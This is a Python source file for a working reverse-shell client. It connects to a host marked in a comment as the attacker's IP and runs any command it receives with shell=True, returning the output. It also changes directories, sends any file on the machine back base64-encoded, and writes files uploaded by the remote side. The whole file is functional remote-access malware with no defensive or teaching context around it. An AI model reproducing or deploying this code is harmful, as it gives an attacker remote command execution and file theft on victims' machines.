import socket
import subprocess
import os
import base64

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('127.0.0.1', 12345)) # IP of attacker

while True:
    command_recv = client.recv(4096).decode()

    if command_recv == "exit":
        break

    elif command_recv == "":
        pass

    elif command_recv[:2] == "cd":
        try:
            os.chdir(command_recv[3:])
            result = f"[+] Moved to {os.getcwd()}"
        except Exception as e:
            result = f"[!] Error: {str(e)}"
        client.send(result.encode())

    elif command_recv[:8] == "download":
        try:
            with open(command_recv[9:], 'rb') as file_download:
                file_content = file_download.read()
                client.send(base64.b64encode(file_content))
        except Exception as e:
            client.send(str(e).encode())

    elif command_recv[:6] == "upload":
        with open(command_recv[7:], 'wb') as file_upload:
            data = client.recv(1000000)
            file_upload.write(base64.b64decode(data))

    else:
        proc = subprocess.Popen(command_recv, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        command_result = proc.stdout.read() + proc.stderr.read()
        command_send = client.send(command_result)
